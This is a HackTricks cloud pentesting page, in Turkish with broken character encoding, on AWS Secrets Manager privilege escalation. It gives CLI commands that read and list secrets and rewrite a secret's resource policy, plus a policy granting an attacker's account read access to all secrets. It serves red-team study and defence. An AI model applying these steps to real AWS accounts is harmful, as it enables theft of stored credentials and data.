# AWS - Secrets Manager Privilege Escalation

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nleri**](https://peass.creator-spring.com)'ni edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)'i **takip edin**.
* Hacking hilelerinizi **HackTricks** ve **HackTricks Cloud** github depolarÄ±na PR gÃ¶ndererek paylaÅŸÄ±n.

</details>

## Secrets Manager

Daha fazla bilgi iÃ§in secrets manager hakkÄ±nda kontrol edin:

{% content-ref url="../aws-services/aws-secrets-manager-enum.md" %}
[aws-secrets-manager-enum.md](../aws-services/aws-secrets-manager-enum.md)
{% endcontent-ref %}

### `secretsmanager:GetSecretValue`

Bu izne sahip bir saldÄ±rgan, AWS Secrets Manager'da bir gizli iÃ§indeki **kaydedilmiÅŸ deÄŸeri alabilir**.
```bash
aws secretsmanager get-secret-value --secret-id <secret_name> # Get value
```
**Potansiyel Etki:** AWS secrets manager servisi iÃ§indeki yÃ¼ksek hassasiyetli verilere eriÅŸim saÄŸlanabilir.

### `secretsmanager:GetResourcePolicy`, `secretsmanager:PutResourcePolicy`, (`secretsmanager:ListSecrets`)

Ã–nceki izinlerle, **diÄŸer prensiplere/hesaplara (dÄ±ÅŸarÄ±dan bile)** **eriÅŸim izni** vermek mÃ¼mkÃ¼ndÃ¼r. UnutmayÄ±n ki, bir KMS anahtarÄ±yla ÅŸifrelenmiÅŸ sÄ±rlarÄ± **okumak iÃ§in**, kullanÄ±cÄ±nÄ±n aynÄ± zamanda **KMS anahtarÄ±na eriÅŸimi** olmasÄ± gerekmektedir (daha fazla bilgi iÃ§in [KMS Enum sayfasÄ±na](../aws-services/aws-kms-enum.md) bakÄ±n).
```bash
aws secretsmanager list-secrets
aws secretsmanager get-resource-policy --secret-id <secret_name>
aws secretsmanager put-resource-policy --secret-id <secret_name> --resource-policy file:///tmp/policy.json
```
policy.json:

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowListSecrets",
            "Effect": "Allow",
            "Action": [
                "secretsmanager:ListSecrets"
            ],
            "Resource": "*"
        },
        {
            "Sid": "AllowGetSecretValue",
            "Effect": "Allow",
            "Action": [
                "secretsmanager:GetSecretValue"
            ],
            "Resource": "arn:aws:secretsmanager:us-west-2:123456789012:secret:MySecret"
        }
    ]
}
```

This `policy.json` file contains an AWS IAM policy that grants two permissions related to AWS Secrets Manager. The first permission allows the user to list all secrets in the account by using the `secretsmanager:ListSecrets` action. The second permission allows the user to retrieve the value of a specific secret named "MySecret" by using the `secretsmanager:GetSecretValue` action. The `Resource` field specifies the ARN (Amazon Resource Name) of the secret, which is in the format `arn:aws:secretsmanager:<region>:<account-id>:secret:<secret-name>`. In this example, the secret is located in the `us-west-2` region and belongs to the AWS account with the ID `123456789012`.
```json
{
"Version" : "2012-10-17",
"Statement" : [ {
"Effect" : "Allow",
"Principal" : {
"AWS" : "arn:aws:iam::<attackers_account>:root"
},
"Action" : "secretsmanager:GetSecretValue",
"Resource" : "*"
} ]
}
```
<details>

<summary><strong>AWS hackleme becerilerini sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELÄ°K PLANLARINA**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi paylaÅŸarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na PR gÃ¶ndererek katkÄ±da bulunun.

</details>
